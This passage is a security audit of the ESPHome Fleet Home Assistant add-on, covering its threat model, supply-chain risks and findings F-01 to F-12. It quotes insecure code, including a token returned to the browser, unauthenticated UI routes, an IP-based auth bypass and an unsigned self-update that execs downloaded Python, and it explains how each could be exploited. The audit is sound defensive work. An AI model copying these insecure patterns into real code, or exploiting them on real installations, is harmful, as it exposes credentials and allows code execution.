# Security Audit: ESPHome Fleet

**Original audit:** 2026-03-29 (version 0.0.21; at the time of audit the product was called "ESPHome Distributed Build Server", renamed to ESPHome Fleet in 1.4.1, renumbered to 1.5.0 late cycle).
**Last refreshed:** 2026-04-16 against 1.5.0-dev.75+.
**Scope:** Server add-on (`ha-addon/server/`), Dockerfile, `run.sh`, `config.yaml`, and the bundled worker (`client/client.py`) as it interacts with the server security model.

> **Refresh note (2026-04-16):** Walk-through with the project owner against current code. Status flips in this refresh:
> - **F-06, F-07, F-08, F-17** moved OPEN/PARTIAL → **WONTFIX** — each is by-design for the documented home-network threat model (see new Threat Model section below). The code isn't changing; this is the audit catching up to the decisions.
> - **F-11** moved WONTFIX → **INFO** — build logs contain values the server already has (it distributed them in `secrets.yaml` via the job bundle); logging them back doesn't cross a trust boundary. Not a finding.
> - **F-14** and **F-15** moved OPEN → **FIXED (1.5.0-dev.77)** via SA.2 and SA.1 respectively — token file chmod + `X-Ingress-Path` sanitizer both shipped in the same dev cycle.
> - **F-19** confirmed **FIXED** in 1.4.1 via SC.1 (SHA-pinned Actions + `check-invariants.sh` rule).
> - **F-18** is now **FIXED (partial)** in 1.5.0 via SC.3 — worker installs consult a hash-pinned constraints file per ESPHome version. Missing-file path still degrades to an unpinned install with a WARNING (so older ESPHome versions keep working through the upgrade); flipping that to a refusal is the remaining roadmap item. See §F-18 below.
>
> New **Threat Model** section added immediately below the executive summary to make the deployment assumptions explicit — F-01/F-02/F-04/F-05/F-06/F-07/F-08/F-17 all trace back to it.

---

## Executive Summary

ESPHome Fleet is a Home Assistant add-on that coordinates remote firmware compilation. Its threat model is deliberately relaxed: it runs on a trusted home network, behind Home Assistant's ingress authentication for the browser UI, and uses a shared secret token for build workers. Within that context, the implementation is generally sound — the code is clean, intentional, and most of the obvious risks are already mitigated.

However, several meaningful security issues remain. The most significant are:

1. **The server token is transmitted to any browser that opens the UI** (HIGH). The `/ui/api/server-info` endpoint returns the raw auth token, which is then embedded in the "Connect Worker" docker command shown to the user. This deliberately exposes the credential to the browser, but it also means any network observer or compromised browser extension obtains a fully working API credential.

2. **The worker auto-update mechanism executes arbitrary code delivered by the server** (HIGH). Build workers automatically download Python source files from the server and replace their own code on disk, then exec themselves. A server compromise — or a man-in-the-middle against plaintext HTTP — results in arbitrary code execution on every connected build machine.

3. **The UI API has no authentication** (MEDIUM in context, would be HIGH outside HA). All `/ui/api/*` endpoints rely entirely on HA Ingress to enforce authentication. If the add-on port (8765) is reachable directly without going through HA, anyone can enqueue builds, read logs (including secrets), edit YAML configs, and remove workers with no credentials at all.

4. **`secrets.yaml` is included in every build bundle** sent to workers (MEDIUM). Every build worker receives a full tarball of the ESPHome config directory, including `secrets.yaml`, which typically contains Wi-Fi passwords, API keys, and OTA passwords.

5. **Unbounded queue growth** enables denial of service (LOW/MEDIUM) from any authenticated worker.

The findings below are detailed with affected code locations and concrete recommendations.

---

## Threat Model

**Deployment assumption.** ESPHome Fleet is deployed as a Home Assistant add-on on a **trusted home LAN**. The server, all build workers, the Home Assistant instance, and the ESP32/ESP8266 devices all share this LAN. The design deliberately optimizes for **operator convenience** over hardening against a LAN-local adversary. This is the same trust posture as Home Assistant itself, Node-RED, Frigate, Zigbee2MQTT, and the other canonical HA add-ons: if an attacker is already inside your LAN, the compromise budget for "my home-automation firmware server" is already spent.

Explicit trust assumptions that this audit treats as accepted risk:

1. **The browser is trusted.** Anyone who can open the UI (i.e. has HA credentials and is on the network) is authorized to do everything the UI allows. The UI deliberately exposes the shared worker bearer token to the browser so the Connect Worker modal can render a ready-to-paste `docker run` command (**F-01**). Risk: the token is now readable by any extension or devtools user in the same browser. Accepted.
2. **The LAN is trusted.** Server ↔ worker traffic is plaintext HTTP (**F-05**). Users who want to run a worker across network segments (over a VPN, across a WAN) are expected to front the server with their own reverse proxy for TLS — documented behaviour.
3. **Every connected worker is trusted.** Workers authenticate with a shared bearer token; once authenticated, a worker can register, claim any job, submit any result (**F-08**), read full build bundles including `secrets.yaml` (**F-04**), and — because YAML can reference `external_components` / `includes` / `libraries` — execute Python sourced from external git repositories during compile (**F-17**). A compromised worker is a compromised fleet. The ESPHome ecosystem's YAML-driven code-loading semantics make this unavoidable without giving up core features users rely on.
4. **The HA Supervisor is trusted.** The bundled `172.30.32.2` IP bypass on `/api/v1/*` (**F-06**) is the standard HA add-on pattern — any process with access to the Docker bridge network the Supervisor lives on can call the worker API without a token. Accepted because that network is Supervisor-controlled.
5. **Anyone with UI access is trusted to edit configs.** The UI API has **no rate limiting** (**F-07**) and **no job-result-authorship check** beyond "are you a registered worker" (**F-08**). Per the home-lab scale (one or two concurrent operators), these are acceptable.
6. **Build logs are not secrets-safe** (**F-11**) — but this is a property of the ESPHome build system, not a trust-boundary crossing. Logs contain values (WiFi passwords, API keys) that the server itself distributed to the worker in `secrets.yaml`. Returning them to the server that already has them doesn't leak anything new.

**What the threat model does NOT accept:**

- **External adversaries** reaching the add-on from the Internet — by design the add-on is LAN-only; users who expose port 8765 to the Internet are explicitly out-of-scope (we document this in `ha-addon/DOCS.md`).
- **Direct-port access bypassing HA Ingress** — closed in 1.5 via mandatory `require_ha_auth` (AU.1–AU.7 / **F-03**). Direct port 8765 requests require a valid Bearer — either the add-on's shared worker token (used automatically by the native HA integration) or a Home Assistant long-lived access token.
- **Supply-chain compromise** of the add-on itself — covered by the Supply Chain Threat Model below: hash-pinned lockfiles (**F-12**), SHA-pinned GitHub Actions (**F-19**), cosign-signed GHCR images, `pip-audit` + `npm audit` CI gates, PY-7/PY-8 invariants.
- **Tampering with worker updates at the image layer** — workers update via `docker pull` of cosign-signed GHCR images. Source-code auto-update (**F-02**) was temporarily disabled in 1.4.1-dev.60 and restored in dev.62 (bug #58); the threat model treats the shared bearer token as the trust boundary there (a compromised token = full fleet compromise either way).
- **Tampering with the ESPHome package at `pip install` time on workers** (**F-18**) — **partially closed in 1.5.0** (SC.3). Worker pip installs now consult a hash-pinned constraints file per ESPHome version shipped inside the worker Docker image; installs for a covered version use `--require-hashes` and refuse any wheel whose SHA-256 doesn't match. Installs for a version that doesn't have a committed constraints file still succeed but log a WARNING — the roadmap is to flip that to a refusal once we have constraints committed for every version we support. See F-18 below.

**What this means for the findings below.** F-01 / F-02 / F-04 / F-05 / F-06 / F-07 / F-08 / F-11 / F-13 / F-16 / F-17 are all accepted per this threat model and marked **WONTFIX** (or INFO). Their presence in this document is documentation, not backlog. F-03 / F-09 / F-10 / F-12 / F-14 / F-15 / F-18 / F-19 / F-20 are **FIXED** (F-18 partial — see below). No open findings remain.

---

### Post-audit mitigations (shipped since the original audit)

**1.3.1 (supply-chain + hardening pass, Workstream E):**
- **Hash-pinned Python dependencies** — both `ha-addon/server/requirements.lock` and `ha-addon/client/requirements.lock` generated with `pip-compile --generate-hashes --strip-extras`. Dockerfiles install via `pip install --require-hashes -r requirements.lock`. Closes F-12 at image-build time. `scripts/refresh-deps.sh` regenerates both lockfiles.
- **CI audit gates** — `pip-audit --requirement <lockfile>` runs in CI for both server and client on every push; `npm audit --audit-level=high --omit=dev` gates the frontend job. Hard failures; any known high/critical advisory blocks merge unless explicitly ignored (see PY-7 below).
- **Dependabot** — weekly PRs for pip × 2 (server + client), npm × 1 (UI), docker × 2, and github-actions × 1. Open-PR caps kept low to avoid queue pileup.
- **Cosign-signed GHCR images (keyless / GitHub OIDC)** — both `publish-client.yml` and `publish-server.yml` sign every published tag against the build's digest using `sigstore/cosign-installer@v3` + `cosign sign --yes`. No long-lived keys. Verification instructions in `ha-addon/DOCS.md`. Closes "item 9" (unsigned images) from the supply-chain threat model.
- **Security response headers middleware** — `security_headers_middleware` in `main.py` adds `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Permissions-Policy`, and `X-Frame-Options: SAMEORIGIN` to every response **except** `/api/v1/*` (worker tier). CSP allows `wss:` (live log WS), `https://schema.esphome.io` (editor schema), `blob:` workers (Monaco), and `frame-ancestors 'self'` (HA Ingress iframe). Inner-handler headers are not clobbered. Closes F-20.
- **Typed protocol (pydantic v2)** — every `/api/v1/*` handler parses its body through a typed pydantic model in `protocol.py` (byte-identical server/client copies enforced by `tests/test_protocol.py`). Malformed payloads return structured `ProtocolError` responses with HTTP 400 instead of half-processing. `PROTOCOL_VERSION` gate rejects mismatched peers with a clear error. Reduces the injection surface on the worker API (OWASP A03).
- **Auth middleware observability (C.2)** — every 401 emits a structured reason (`missing_authorization_header`, `authorization_not_bearer_scheme`, `bearer_token_mismatch`) plus the peer IP at WARNING. IPv6 zone IDs stripped, IPv4-mapped IPv6 unwrapped. `peername=None` paths no longer crash. Addresses A09 logging gap and F-06 operational observability.
- **Log payload DoS guard (C.3)** — `append_job_log` handler rejects bodies larger than `4 × MAX_LOG_BYTES` (~2MB) with `log_payload_too_large` + HTTP 413 before aiohttp buffers the full input. Augments the existing in-function log cap. Partially addresses F-07.
- **PY-6 invariant** — `protocol.py` bytes must stay identical between server and client copies (enforced by unit test). Prevents wire-contract drift.
- **PY-7 invariant** — every `--ignore-vuln` in `pip-audit` must have an inline applicability assessment: why the fix can't be pulled in, whether the vulnerable code path is actually exercised in this codebase, and a date so staleness is visible. Prevents silent CVE dismissals.
- **PY-8 invariant** — every direct dep in `requirements.txt` must also appear in `requirements.lock`. Enforced by `scripts/check-invariants.sh`. Prevents the 1.3.1-dev.2 class of bug where `croniter` was silently absent from the Docker image because `refresh-deps.sh` wasn't rerun.

**1.4.1 (server-performance + rebrand):**
- **Compression middleware scope** — gzip is applied only to `/ui/api/*` responses (not `/api/v1/*` worker-tier), so the 46 MB config-bundle tarball sent to workers doesn't block the event loop gzipping it synchronously. Not a security fix per se but prevents a latent DoS via the event-loop stall.

**Deliberately still open** (see summary table for status):
- F-18 (worker pip install not hash-pinned) — **FIXED (partial)** in 1.5.0 via SC.3. Worker-time `pip install esphome==<version>` now consults a hash-pinned constraints file shipped inside the worker image. Missing-file branch still degrades to unpinned install with a WARNING; flipping that to a refusal is the remaining 1.6 roadmap item.

(F-02 / F-08 / F-17 accepted per threat model in the 2026-04-16 refresh. F-14 / F-15 / F-19 all shipped fixes in the 1.4.1–1.5 cycle — see summary table for release tags.)

---

## Supply Chain Threat Model

This section covers supply-chain surface **introduced or amplified by this project**. Generic ESPHome-ecosystem trust assumptions (the PlatformIO registry, framework SDKs, ESPHome's own `external_components` / `includes` / `libraries` feature) are inherited from any ESPHome install and are not re-litigated here.

In priority order:

1. **Worker installs `esphome==<version>` from PyPI at job time.** `ha-addon/client/version_manager.py:137` shells out to `pip install --no-cache-dir esphome==<version>` with no `--require-hashes`, no index restriction, and no constraint file. The version string is chosen by the worker based on the target YAML's `esphome.esphome_version` (or the server's recommendation). A compromised ESPHome release — or any of its several-hundred transitive dependencies — executes arbitrary Python on every worker the next time it compiles a target pinned to that version. This is strictly worse than F-02 (the server-driven source auto-update) because it does not require the server to be compromised at all: it only requires *any* package in ESPHome's dependency graph to have a bad release. There is no allow-list, no hash manifest, and no signed-build verification.

2. **`python:3.11-slim` base image and apt packages are not digest-pinned.** Both `ha-addon/Dockerfile` and `ha-addon/client/Dockerfile` use `FROM python:3.11-slim` (tag, not digest) and `apt-get install -y gcc libffi-dev libssl-dev git` without version constraints. Each rebuild resolves the latest published layer from Docker Hub and the latest apt snapshot from Debian. This is partially constrained by HA's add-on build infrastructure on the server side but fully unconstrained on the client image we publish ourselves. Tracked as F-13 (and extended here).

3. **GitHub Actions are referenced by floating tags** (`actions/checkout@v4`, `actions/setup-python@v5`, `actions/setup-node@v4`, `actions/upload-artifact@v4`) in every workflow file. A tag-move attack on any of these — or a compromise of a transitively-used action — pushes attacker code into our CI with full access to repo secrets and the GHCR publish token. Tracked as F-19.

4. **Python requirements use `>=` constraints** with no lockfile, no `--require-hashes`, and no `pip-audit` in CI. Both `ha-addon/server/requirements.txt` and `ha-addon/client/requirements.txt`. Tracked as F-12.

5. **Frontend npm has `package-lock.json`** (which does lock hashes transitively, so this is meaningfully better than the Python side), but `package.json` uses `^` ranges, there is no `npm audit` gate in CI, and no advisory feed is consulted before release.

6. **Server distributes worker source code via `/api/v1/client/code`** and workers execv themselves into it (F-02 chain). The supply-chain relevance is that this pathway bypasses any Docker-image signing or provenance we might add later — fixing upstream build provenance without also fixing F-02 leaves the bypass in place.

7. **No SBOM is generated for either Docker image**, and GHCR images are not signed (no cosign attestations, no provenance). Downstream users have no way to verify what they're running matches this source tree.

**Mitigation state (as of 1.4.1-dev):**
- Item 1 (worker pip install) — **FIXED (partial)** in 1.5.0 via SC.3. Image-build dependencies are hash-pinned (F-12 closed), and worker-time `pip install esphome==<version>` now uses `--require-hashes` + a committed constraints file when one ships for the requested version (F-18 partial). Missing-file path logs a WARNING and installs unpinned — graceful-degradation for older ESPHome versions we haven't committed constraints for yet.
- Item 2 (base image not digest-pinned) — WONTFIX. HA add-on build infrastructure controls BUILD_FROM.
- Item 3 (GitHub Actions floating tags) — partial. Dependabot now opens weekly PRs for major-version bumps, but the actions themselves are still referenced by major tag, not SHA. F-19 remains open.
- Item 4 (Python requirements unpinned) — **closed**. Lockfiles with `--require-hashes` + `pip-audit` in CI + Dependabot + PY-8 invariant. F-12 resolved.
- Item 5 (npm audit not in CI) — **closed**. `npm audit --audit-level=high --omit=dev` runs in the frontend CI job.
- Item 6 (worker source via `/api/v1/client/code`) — unchanged. F-02 still open; image-version gating (`IMAGE_VERSION`/`MIN_IMAGE_VERSION`) landed in 1.3.0 narrowed the blast radius to workers on a current Docker image, but no signature verification yet.
- Item 7 (no SBOM, no signing) — **closed for signing**. All GHCR tags are cosign-signed via keyless GitHub OIDC (E.10). SBOM generation still deferred (E.7 in the 1.3.1 plan, not blocking).

---

## Risk Rating Scale

| Rating   | Meaning |
|----------|---------|
| Critical | Can be exploited to compromise the host system or HA instance without any credentials |
| High     | Significant impact, exploitable by a network-adjacent attacker or with minimal access |
| Medium   | Real impact but requires either local access, existing credentials, or a specific attack chain |
| Low      | Minor hardening issues or defence-in-depth gaps |
| Info     | Observations and best-practice notes with negligible direct risk |

---

## Findings

### F-01 — Auth Token Exposed to Browser via `/ui/api/server-info`

**Severity:** HIGH

**Description:**

`ui_api.py` line 32 returns `cfg.token` directly in the JSON response to the browser:

```python
return web.json_response({
    "token": cfg.token,
    "port": cfg.port,
    ...
})
```

The browser uses this to render a pre-filled `docker run` command in the "Connect Worker" modal. This is convenient UX, but the consequence is that:

- The raw Bearer token is stored in JavaScript memory and accessible to any script running in the same browser origin.
- Any browser extension with broad permissions, XSS injection, or JavaScript console access can read the token.
- The token is also readable by any browser developer who opens DevTools → Network while the UI is open.
- The token is transmitted over plaintext HTTP from the add-on to the browser (see F-05).

The token grants full access to all `/api/v1/*` endpoints: register workers, claim jobs, submit results, and read build logs.

**Affected code:** `ui_api.py:32` (`get_server_info`), `static/index.html:706-714` (`renderDockerCmd`)

**Recommended fix:**

Do not return the full token to the browser. Instead, serve the docker command server-side (as a pre-rendered string), masking everything except the last 4 characters for visual confirmation. Alternatively, provide a dedicated "copy token" flow that requires a deliberate user action and does not store the token in global JavaScript state. At minimum, consider returning only a token prefix for display purposes.

---

### F-02 — Worker Auto-Update Executes Arbitrary Python Code from Server

**Severity:** HIGH

**Description:**

`client/client.py` lines 495–516 implement an auto-update mechanism. When the server reports a newer worker version, the worker downloads all `.py` files from `/api/v1/client/code` and writes them directly over its own source files, then calls `os.execv` to restart itself:

```python
for filename, content in files.items():
    if not filename.endswith(".py"):
        continue
    target = (client_dir / filename).resolve()
    if target.parent != client_dir:
        logger.warning("Skipping suspicious path in update: %s", filename)
        continue
    target.write_text(content, encoding="utf-8")
```

The path check (`target.parent != client_dir`) prevents writing outside the client directory, which is a correct safeguard. However, the content written is unchecked Python source that will execute with the client process's full privileges as soon as `os.execv` is called.

This means:

- If the server is compromised, every connected build worker immediately executes attacker-controlled code.
- If the HTTP connection is intercepted (the transport is plaintext HTTP — see F-05), a MitM attacker can inject arbitrary code.
- There is no signature verification, checksum, or integrity check of any kind on the downloaded files.
- The version check is purely a string comparison (`sv != CLIENT_VERSION`); the server controls both the version string and the code.

Additionally, `api.py` lines 237–252 (`get_client_code`) simply globs `*.py` files from `/app/client/` and returns them verbatim. There is no manifest, no signing key, and no way for the worker to distinguish a legitimate update from a tampered one.

**Affected code:** `client/client.py:480-518` (`_apply_update`), `api.py:237-253` (`get_client_code`)

**Recommended fix:**

The safest fix is to remove the auto-update mechanism entirely and rely on Docker image updates. If auto-update is retained, the server should sign the code bundle (e.g., with a private key stored in `/data/`), and the worker should verify the signature before writing any files. At minimum, add a SHA-256 hash of the bundle to the server response and verify it worker-side. The hash alone does not prevent a MitM attack over HTTP, but combined with HTTPS it provides meaningful integrity.

---

### F-03 — UI API Has No Authentication; Relies Entirely on HA Ingress

**Status:** FIXED (mandatory) in 1.5.0 via `require_ha_auth` add-on option (AU.3), now defaulting to `true` per AU.7. Direct-port `/ui/api/*` requests that don't carry a valid Bearer token are rejected with 401 + `WWW-Authenticate: Bearer realm="ESPHome Fleet"`. Two Bearer shapes are accepted: (a) the add-on's own shared worker token — used by the native HA integration's coordinator, which receives it automatically via the Supervisor-discovery payload (AU.7); (b) a Home Assistant long-lived access token, validated against Supervisor's `/auth` endpoint (AU.2). Ingress-tunneled access is unaffected (Supervisor adds the `X-Ingress-Path` header). See AU.1–AU.7 in WORKITEMS-1.5.md.

**Severity:** MEDIUM (HIGH if port 8765 is directly reachable) — pre-fix

**Description:**

All `/ui/api/*` endpoints are unconditionally allowed by the auth middleware in `main.py` lines 37-38:

```python
if path.startswith("/ui/api/") or path in ("/", "/index.html"):
    return await handler(request)
```

No token, session, or credential check of any kind is performed. This is acceptable when HA Ingress is the only path to those endpoints. However, the add-on also exposes port 8765 directly to the host network (`config.yaml` lines 18-19: `ports: 8765/tcp: 8765`).

If any of the following is true, the UI API is fully open to the LAN:

- The user has not configured a firewall rule blocking port 8765.
- The user accesses the UI via the direct port rather than through HA Ingress.
- Another device on the LAN makes a direct HTTP request to the HA host on port 8765.

Through the unauthenticated UI API, an attacker on the LAN can:

- Enqueue compile jobs for any configured ESPHome target (`POST /ui/api/compile`).
- Read full build logs, which may contain device credentials in error output (`GET /ui/api/queue`).
- Read and **write** any `.yaml` config file in the ESPHome config directory (`GET/POST /ui/api/targets/{filename}/content`).
- Read device IP addresses, firmware versions, and other device metadata.
- Remove or disable build workers.

**Affected code:** `main.py:37-38`, `ui_api.py` (all endpoints), `config.yaml:18-19`

**Recommended fix:**

Add a secondary auth check to the UI API that validates the `X-Ingress-Path` or `X-Supervisor-Token` header (both injected by HA Ingress and absent on direct connections). Alternatively, bind the server to `127.0.0.1` only for the ingress path, and use a separate port with token auth for direct client access. At minimum, document the exposure clearly and recommend a firewall rule.

---

### F-04 — `secrets.yaml` Included in Every Build Bundle Sent to Workers

**Severity:** MEDIUM

**Description:**

`scanner.py` lines 37-55 (`create_bundle`) tarballs the entire ESPHome config directory recursively and sends it to build workers as a base64-encoded payload in the job response:

```python
for path in sorted(base.rglob("*")):
    if not path.is_file():
        continue
    arcname = str(path.relative_to(base))
    tar.add(str(path), arcname=arcname)
```

`secrets.yaml` is intentionally excluded from the list of *compile targets* (`scan_configs` line 30), but it is explicitly included in the bundle because ESPHome's `!secret` directive requires it at compile time. The CLAUDE.md documentation acknowledges this.

The consequence is that every authenticated build worker receives a copy of `secrets.yaml` on every job, whether or not the specific target being compiled uses any secrets. `secrets.yaml` in a typical ESPHome installation contains Wi-Fi SSIDs and passwords, API encryption keys, OTA passwords, and MQTT credentials.

While build workers are authenticated and presumably trusted machines, this increases the blast radius of a compromised worker and unnecessarily distributes sensitive credentials to all build workers.

**Affected code:** `scanner.py:37-55` (`create_bundle`)

**Recommended fix:**

Parse the target YAML (ESPHome already has a resolver for this — `_resolve_esphome_config` in scanner.py does it) and identify which secrets are actually referenced by the specific target. Deliver only those secrets, or better, perform secret substitution server-side before bundling, so no `secrets.yaml` needs to leave the server at all. If server-side substitution is not feasible, at minimum document the exposure in the add-on description so operators understand what data leaves the HA host.

---

### F-05 — All Worker-Server Communication Is Plaintext HTTP

**Severity:** MEDIUM

**Description:**

Build workers connect to the server over `http://` (plaintext). The server URL is generated in the UI's docker command (`static/index.html:713`):

```javascript
const serverUrl = `http://${host}:${port}`;
```

For build workers connecting across a LAN, all of the following are transmitted in cleartext:

- The Bearer auth token (on every request).
- The full ESPHome config bundle including `secrets.yaml` (F-04), sent per job.
- Build logs which may contain device credentials in error output.
- The worker auto-update code (see F-02 — MitM can inject arbitrary Python).

On most home networks, this risk is low in practice, but it is a meaningful concern in environments where the HA host and the build workers are on separate network segments (e.g., a remote builder in a different physical location).

**Affected code:** `static/index.html:713`, `run.sh:24`, `client/client.py:261-264` (HEADERS)

**Recommended fix:**

Support HTTPS for the server. For a home network add-on, the most practical option is to allow the user to configure an existing reverse proxy (Nginx Proxy Manager, Traefik) in front of port 8765 and document that as the recommended path for remote clients. Add a configuration option `require_https: bool` that logs a warning if remote clients connect over HTTP.

---

### F-06 — Supervisor IP Bypass Allows Unauthenticated API Access from HA Supervisor

**Status (2026-04-16):** **WONTFIX** — by design for an HA add-on. The `172.30.32.2` bypass is the standard HA Supervisor-trust pattern: any add-on on the Supervisor-controlled Docker bridge network is inside the same trust boundary as the Supervisor itself. The 1.3.1 hardening (`_normalize_peer_ip()` handling IPv6 / zone IDs / `peername=None` / IPv4-mapped IPv6; structured 401 logging) stays. The IP constant (`HA_SUPERVISOR_IP`) stays named so any future Supervisor-IP change is a one-spot fix.

**Severity:** LOW (info for the deployment model; design decision to document)

**Description:**

`main.py` lines 47-48 and `api.py` lines 45-46 unconditionally trust any request originating from `172.30.32.2`:

```python
if peer_ip == "172.30.32.2":
    return await handler(request)
```

This is the HA Supervisor's internal address, and the intent is to allow the supervisor to call the worker API without needing a token. The trust is based solely on the source IP, which is not spoofable from outside the Docker network in a normal HA installation.

However, this means any process on the same Docker network as the add-on (including other HA add-ons that may be compromised) can make unauthenticated requests to all `/api/v1/*` endpoints, including job manipulation, worker registration, and log retrieval.

The IP is also hardcoded as a string literal in two places; if the Supervisor's IP ever changes, the bypass silently stops working with no diagnostic.

**Affected code:** `main.py:47-48`, `api.py:45-46`

**Recommended fix:**

Consider whether the Supervisor actually needs to call `/api/v1/*` endpoints at all. If not, remove the bypass entirely. If yes, prefer HA's `SUPERVISOR_TOKEN` header (`X-Supervisor-Token`) over IP-based trust, as it is a proper credential rather than a network address. Define the IP as a named constant or config value rather than a bare string literal.

---

### F-07 — No Rate Limiting or Queue Size Cap

**Status (2026-04-16):** **WONTFIX** for the home-lab threat model. The operator is trusted; queue-flooding from the UI requires HA credentials. The 1.3.x partial-mitigations (per-job log size cap of 512 KB via SEC.2; `max_parallel_jobs` clamp to 0–32 via SEC.3; `Content-Length` guard ~2 MB on log-append via C.3 → HTTP 413) stay as sensible sanity limits. No queue-depth cap or retry rate-limit planned — a home fleet at 67 devices doesn't generate queue pressure worth defending against.

**Severity:** LOW

**Description:**

Any authenticated worker (or a UI user, who is unauthenticated — see F-03) can enqueue jobs without any rate limit or maximum queue depth. The `JobQueue.enqueue` method deduplicates by target (one active job per target), which provides meaningful protection against trivial queue flooding for known targets. However:

- A worker with the token can rapidly submit result payloads with arbitrarily large log strings. The `log` field is stored in memory and persisted to `/data/queue.json` with no size cap.
- The `/ui/api/retry` endpoint can be called repeatedly to re-enqueue failed jobs, creating a cycle with no backoff.
- The queue file path is hardcoded to `/data/queue.json`. If `/data` is on the same filesystem as the HA OS, a malicious or buggy worker submitting huge logs could potentially exhaust disk space.

**Affected code:** `job_queue.py:166-216` (`enqueue`), `api.py:177-207` (`submit_job_result`)

**Recommended fix:**

Add a maximum log length (e.g., 512 KB) when accepting job results. Add a maximum total queue size (e.g., 500 jobs). Consider a rate limit on the retry endpoint.

---

### F-08 — Job ID Is Not Validated Against the Claiming Worker

**Status (2026-04-16):** **WONTFIX** per threat model — every authenticated worker is trusted (shared-bearer-token model; a compromised token = full fleet compromise via many other paths). Partial credit: the firmware-upload endpoint added in 1.4.1 **does** enforce `X-Client-Id == job.assigned_client_id` (bug #24 fix — data-loss race), but that was done because the race caused *non-malicious* data loss, not because the threat model requires per-worker authorization in general. `submit_result` / `update_status` still accept any authenticated worker writing to any job. Not remediating further.

**Severity:** LOW

**Description:**

`api.py` lines 177-207 (`submit_job_result`) accepts a result from any authenticated worker for any job ID, regardless of whether that worker was assigned the job:

```python
job_id = request.match_info["id"]
...
ok = await queue.submit_result(job_id, status, log, ota_result)
```

The `queue.submit_result` method does check that the job is in `WORKING` state, but it does not verify that the submitting worker is the one assigned to the job (`job.assigned_client_id`). This means:

- Worker A can submit a failure result for a job that was assigned to Worker B, causing the job to be marked failed even though Worker B is still working on it.
- A malicious or buggy worker can poison job results for other workers' work.

The same issue applies to `update_job_status` (`/api/v1/jobs/{id}/status`): any authenticated worker can update the status text of any job.

**Affected code:** `api.py:177-207` (`submit_job_result`), `api.py:210-226` (`update_job_status`), `job_queue.py:259-299` (`submit_result`)

**Recommended fix:**

Pass the submitting `client_id` (from the authentication context, not from the request body) to `queue.submit_result` and `queue.update_status`, and reject submissions where `client_id != job.assigned_client_id`.

---

### F-09 — Path Traversal Check Uses `resolve()` on a Non-Existent Path

**Severity:** LOW

**Description:**

`ui_api.py` lines 213-218 and 233-238 guard against path traversal using `Path.resolve()` before the file exists:

```python
path = (config_dir / filename).resolve()
try:
    path.relative_to(config_dir.resolve())
except ValueError:
    return web.json_response({"error": "Invalid filename"}, status=400)
```

`Path.resolve()` on a non-existent path behaves differently across Python versions. On Python 3.5 and earlier, it raises `FileNotFoundError` for non-existent paths; on Python 3.6+, it resolves the path purely lexically if `strict=False` (the default). On Python 3.6+, this check is correct for preventing `../` traversal because lexical resolution handles `..` components.

However, the check does not defend against symlinks: if the ESPHome config directory contains a symlink that points outside the directory, `resolve()` will follow the symlink and the `relative_to` check will fail (raising `ValueError`), so the file would be rejected — this is the correct behavior. **But** for the write endpoint (`save_target_content`), the check only guards the *path*; it does not prevent writing a YAML file that itself contains `!include` directives pointing to files outside the config directory. This is then processed by `_resolve_esphome_config` via ESPHome's own YAML resolver.

**Affected code:** `ui_api.py:213-218`, `ui_api.py:233-238`

**Recommended fix:**

The existing check is adequate for the file read/write operations themselves. Consider adding `strict=True` to the `resolve()` call on the read path (where the file must exist) to make the intent explicit and catch edge cases. Document that the ESPHome YAML `!include` attack surface is inherited from ESPHome's own resolver, not this server.

---

### F-10 — Monaco Editor Loaded from Unpinned CDN

**Severity:** LOW

**Description:**

`static/index.html` lines 1345-1348 load the Monaco editor from `unpkg.com`:

```javascript
script.src = 'https://unpkg.com/monaco-editor@0.44.0/min/vs/loader.js';
require.config({ paths: { vs: 'https://unpkg.com/monaco-editor@0.44.0/min/vs' } });
```

The version `0.44.0` is pinned, which is good. However, `unpkg.com` is a third-party CDN with no SRI (Subresource Integrity) hash on the script tag. If `unpkg.com` is compromised, or if an attacker can intercept the HTTP request to it (the UI itself is served over plaintext — see F-05), they can inject arbitrary JavaScript into the admin UI. This would give them access to the token stored in `serverInfo.token` (see F-01).

The ESPHome logo is also loaded from `https://media.esphome.io/` and the favicon from `https://esphome.io/`, expanding the external script/resource surface.

**Affected code:** `static/index.html:1345-1348`

**Recommended fix:**

Add `integrity="sha384-..."` SRI attributes to the Monaco script tag. Better, bundle Monaco into the Docker image and serve it as a static file, eliminating the external CDN dependency entirely. This also makes the UI work in offline/air-gapped HA installations.

---

### F-11 — Build Log Content Stored Unredacted

**Status (2026-04-16):** **Not a finding (INFO)** — re-assessed. The logs contain values (WiFi passwords, API keys, OTA passwords) that the **server itself distributed** to the worker via the job bundle's `secrets.yaml` (F-04, accepted). When the worker logs an error containing those substituted values, it's returning data the server already has back to the server that sent it. No trust boundary is crossed, no information is leaked that wasn't already on the server's disk. Displaying those logs in the browser UI is an F-03-adjacent concern already addressed by the mandatory `require_ha_auth` in 1.5 (AU.7). Removing from the residual-findings list.

**Severity:** LOW

**Description:**

`api.py` lines 189, 203 accept and store the `log` field from clients without any filtering or size limit. Build logs from ESPHome compilation frequently contain:

- Wi-Fi SSID and password (when a compile error includes the full config in the traceback).
- OTA password.
- API encryption key.
- Any value substituted from `secrets.yaml` via ESPHome's substitution system.

These logs are returned verbatim to the browser UI via `/ui/api/queue`, accessible without authentication (see F-03).

**Affected code:** `api.py:189,203`, `job_queue.py:66-87` (`to_dict`), `ui_api.py:94-99` (`get_queue`)

**Recommended fix:**

Consider scrubbing known-sensitive patterns from build logs before storage (e.g., lines containing `password:`, `key:`, `ssid:` where the value appears to be a secret). This is imperfect but reduces accidental exposure. More robustly, restrict the queue/log API to authenticated access even in the UI tier.

---

### F-12 — Dependency Versions Not Pinned

**Severity:** LOW

**Description:**

`ha-addon/server/requirements.txt` uses minimum-version constraints only (`>=`):

```
aiohttp>=3.9
aioesphomeapi>=18.0
zeroconf>=0.131
pyyaml>=6.0
esphome>=2024.1.0
requests>=2.31
```

This means each Docker image build resolves the latest compatible versions of all dependencies at build time. A supply-chain compromise of any upstream package that releases a new version compatible with the `>=` constraint will be automatically included in the next image build.

`client/requirements.txt` has a single line `requests>=2.31`, making the client even more exposed.

**Affected code:** `ha-addon/server/requirements.txt`, `client/requirements.txt`

**Recommended fix:**

